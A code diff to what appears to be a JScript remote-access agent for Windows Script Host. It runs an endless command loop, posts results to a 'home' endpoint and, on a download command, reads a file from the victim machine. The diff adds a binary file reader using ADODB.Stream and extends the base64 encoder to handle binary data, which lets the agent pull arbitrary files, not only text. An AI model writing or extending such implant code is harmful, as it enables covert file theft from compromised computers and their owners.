@@ -67,6 +67,16 @@ function post(home, response) {
   return res;
 }
 
+function readbinfile(filename) {
+	var stream = WScript.CreateObject("ADODB.Stream")
+	stream.Open()
+	stream.Type = 1 //adTypeBinary
+	stream.LoadFromFile(filename)
+	var bytes = stream.Read()
+	stream.Close()
+	return bytes
+}
+
 function str2bin(data) {
    var istream = WScript.CreateObject("ADODB.Stream");
    istream.Type = 2
@@ -78,11 +88,16 @@ function str2bin(data) {
    return istream.Read()
 }
 function b64e(data) {
-   var xml = WScript.CreateObject("MSXml2.DOMDocument");
-   var element = xml.createElement("Base64Data");
-   element.dataType = "bin.base64";
-   element.nodeTypedValue = str2bin(data);
-   return element.text.replace(/\n/g, "");
+  var xml = WScript.CreateObject("MSXml2.DOMDocument");
+  var element = xml.createElement("Base64Data");
+  element.dataType = "bin.base64";
+  if(typeof(data) == "string") {
+    element.nodeTypedValue = str2bin(data);
+  }
+  else {
+    element.nodeTypedValue = data;
+  }
+  return element.text.replace(/\n/g, "");
 }
 
 function bin2str(data) {
@@ -162,9 +177,7 @@ while(true)
 		  array.shift() //Cuts off the first element in the array
 		  var filepath = array.join(" ")
 	      if(fso.FileExists(filepath)) {
-		    fd = fso.OpenTextFile(filepath)
-		    retval = fd.ReadAll()
-		    fd.close()
+		    retval = readbinfile(filepath)
 		    rettype = "dl"
 		}
 		else {
